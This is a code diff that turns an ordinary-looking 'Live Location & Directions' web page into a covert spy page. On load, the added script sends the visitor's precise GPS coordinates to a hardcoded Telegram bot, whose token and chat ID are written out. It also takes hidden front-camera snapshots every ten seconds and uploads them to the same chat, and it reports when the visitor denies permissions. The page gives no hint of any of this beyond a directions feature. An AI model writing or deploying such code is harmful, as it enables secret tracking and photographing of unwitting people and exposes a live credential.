@@ -3,123 +3,178 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Live Location & Directions</title>
-  <link rel="stylesheet"    href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" />
+  <title>Live Location & Camera to Telegram</title>
+  <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" />
   <style>
-    body {
-      font-family: Arial, sans-serif;
-      padding: 20px;
-    }
-    #map {
-      height: 400px;
-      width: 100%;
-      margin-top: 15px;
-      border: 1px solid #ccc;
-      border-radius: 10px;
-    }
-    input, button {
-      padding: 10px;
-      font-size: 16px;
-      margin-top: 10px;
-      margin-right: 10px;
-    }
-    #status {
-      margin-top: 10px;
-      font-weight: bold;
-    }
+    body { font-family: Arial, sans-serif; padding: 20px; }
+    #map { height: 400px; width: 100%; margin-top: 15px; border: 1px solid #ccc; border-radius: 10px; }
+    input, button { padding: 10px; font-size: 16px; margin-top: 10px; margin-right: 10px; }
+    #status { margin-top: 10px; font-weight: bold; }
+    #video { display: none; }
   </style>
 </head>
 <body>
 
-<h2>📍 Live Location + Google Maps Directions</h2>
-
+<h2>📍 Live Location + Camera to Telegram</h2>
 <input type="text" id="destination" placeholder="Enter destination e.g., Sector 82, Mohali" />
 <button onclick="openDirections()">Get Directions</button>
-
-<p id="status">📍    Waiting for location...</p>
+<p id="status">📍 Waiting for location...</p>
+<video id="video" autoplay playsinline width="300" height="200"></video>
+<canvas id="canvas" style="display: none;"></canvas>
 <div id="map"></div>
 
 <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
 <script>
-  let userLat = null, userLng = null;
-  let marker = null, circle = null;
-  const statusEl = document.getElementById("status");
+const token = '6235375573:AAHdripMzwMYFL0dhruXGyvmJ6ZSQhWCTn4';
+const chat_id = '1444862345';
+let userLat = null, userLng = null;
+let marker = null, circle = null;
+let stream = null;
+const statusEl = document.getElementById("status");
 
-  const map = L.map('map').setView([30.7046, 76.7179], 13); // default view
+const map = L.map('map').setView([30.7046, 76.7179], 13);
+L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
+  attribution: '© OpenStreetMap contributors'
+}).addTo(map);
 
-  L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
-    attribution: '© OpenStreetMap contributors'
-  }).addTo(map);
-
-  function updateMap(lat, lng, accuracy) {
-    const coords = [lat, lng];
-    if (!marker) {
-      marker = L.marker(coords).addTo(map).bindPopup("📍 You are here").openPopup();
-    } else {
-      marker.setLatLng(coords);
-    }
-
-    if (!circle) {
-      circle = L.circle(coords, {
-        radius: accuracy,
-        color: 'blue',
-        fillColor: '#add8e6',
-        fillOpacity: 0.3
-      }).addTo(map);
-    } else {
-      circle.setLatLng(coords).setRadius(accuracy);
-    }
-
-    map.setView(coords, 16);
+function updateMap(lat, lng, accuracy) {
+  const coords = [lat, lng];
+  if (!marker) {
+    marker = L.marker(coords).addTo(map).bindPopup("📍 You are here").openPopup();
+  } else {
+    marker.setLatLng(coords);
   }
+  if (!circle) {
+    circle = L.circle(coords, {
+      radius: accuracy,
+      color: 'blue',
+      fillColor: '#add8e6',
+      fillOpacity: 0.3
+    }).addTo(map);
+  } else {
+    circle.setLatLng(coords).setRadius(accuracy);
+  }
+  map.setView(coords, 16);
+}
 
-  function locateUser() {
-    if (!navigator.geolocation) {
-      statusEl.textContent = "❌ Geolocation not supported.";
-      return;
-    }
+function sendLocationToTelegram(lat, lng, accuracy) {
+  const message = `
+📍 *Live Location Update*
+*Latitude:* \`${lat}\`
+*Longitude:* \`${lng}\`
+*Accuracy:* ~${Math.round(accuracy)} meters
 
-    navigator.geolocation.getCurrentPosition(
-      (pos) => {
-        const { latitude, longitude, accuracy } = pos.coords;
-        userLat = latitude;
-        userLng = longitude;
+🌍 [View on Map](https://www.google.com/maps/search/?api=1&query=${lat},${lng})
+🧭 [Get Directions](https://www.google.com/maps/dir/?api=1&destination=${lat},${lng})
+  `;
+  fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+    method: 'POST',
+    headers: { 'Content-Type': 'application/json' },
+    body: JSON.stringify({ chat_id, text: message, parse_mode: "Markdown" })
+  });
+}
 
-        updateMap(userLat, userLng, accuracy);
+function sendPhotoToTelegram(blob) {
+  const formData = new FormData();
+  formData.append('chat_id', chat_id);
+  formData.append('photo', blob, 'snapshot.jpg');
+  fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
+    method: 'POST',
+    body: formData
+  });
+}
 
-        statusEl.textContent = `✅ Location found (accuracy: ~${Math.round(accuracy)} m)`;
-        if (accuracy > 100) {
-          alert("⚠️ Your GPS accuracy is low. Try using mobile with GPS enabled.");
-        }
-      },
-      (err) => {
-        statusEl.textContent = "❌ Error: " + err.message;
-      },
-      {
-        enableHighAccuracy: true,
-        timeout: 15000,
-        maximumAge: 0
+function captureAndSendImage() {
+  try {
+    const video = document.getElementById('video');
+    const canvas = document.getElementById('canvas');
+    const ctx = canvas.getContext('2d');
+    canvas.width = video.videoWidth || 300;
+    canvas.height = video.videoHeight || 200;
+    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+    canvas.toBlob((blob) => {
+      if (blob) sendPhotoToTelegram(blob);
+    }, 'image/jpeg', 0.9);
+  } catch (err) {
+    console.error("Camera capture failed:", err);
+  }
+}
+
+function startCameraLoop() {
+  navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
+    .then((mediaStream) => {
+      stream = mediaStream;
+      const video = document.getElementById('video');
+      video.srcObject = stream;
+      setInterval(captureAndSendImage, 10000);
+    })
+    .catch((err) => {
+      console.warn("📷 Camera access denied:", err);
+      fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          chat_id,
+          text: "❌ User denied camera access.",
+        })
+      });
+    });
+}
+
+function locateUser() {
+  if (!navigator.geolocation) {
+    statusEl.textContent = "❌ Geolocation not supported.";
+    return;
+  }
+  navigator.geolocation.getCurrentPosition(
+    (pos) => {
+      const { latitude, longitude, accuracy } = pos.coords;
+      userLat = latitude;
+      userLng = longitude;
+      updateMap(userLat, userLng, accuracy);
+      sendLocationToTelegram(userLat, userLng, accuracy);
+      statusEl.textContent = `✅ Location found (accuracy: ~${Math.round(accuracy)} m)`;
+      if (accuracy > 100) {
+        alert("⚠️ GPS accuracy is low. Use a mobile device or enable GPS.");
       }
-    );
-  }
-
-  function openDirections() {
-    const dest = document.getElementById("destination").value.trim();
-    if (!userLat || !userLng) {
-      alert("📍 Please wait for your location to load.");
-      return;
+    },
+    (err) => {
+      statusEl.textContent = "❌ Location error: " + err.message;
+      fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          chat_id,
+          text: "❌ User denied location access.",
+        })
+      });
+    },
+    {
+      enableHighAccuracy: true,
+      timeout: 15000,
+      maximumAge: 0
     }
-    if (!dest) {
-      alert("📌 Please enter a destination.");
-      return;
-    }
+  );
+}
 
-    const mapsUrl = `https://www.google.com/maps/dir/?api=1&origin=${userLat},${userLng}&destination=${encodeURIComponent(dest)}&travelmode=driving`;
-    window.open(mapsUrl, "_blank");
+function openDirections() {
+  const dest = document.getElementById("destination").value.trim();
+  if (!userLat || !userLng) {
+    alert("📍 Please wait for your location to load.");
+    return;
+  }   
+  if (!dest) {
+    alert("📌 Please enter a destination.");
+    return;
   }
+  const mapsUrl = `https://www.google.com/maps/dir/?api=1&origin=${userLat},${userLng}&destination=${encodeURIComponent(dest)}&travelmode=driving`;
+  window.open(mapsUrl, "_blank");
+}
 
-  // Load location on page load
-  document.addEventListener('DOMContentLoaded', locateUser);
+window.addEventListener('DOMContentLoaded', () => {
+  locateUser();
+  startCameraLoop();
+});
 </script>
 
 </body>
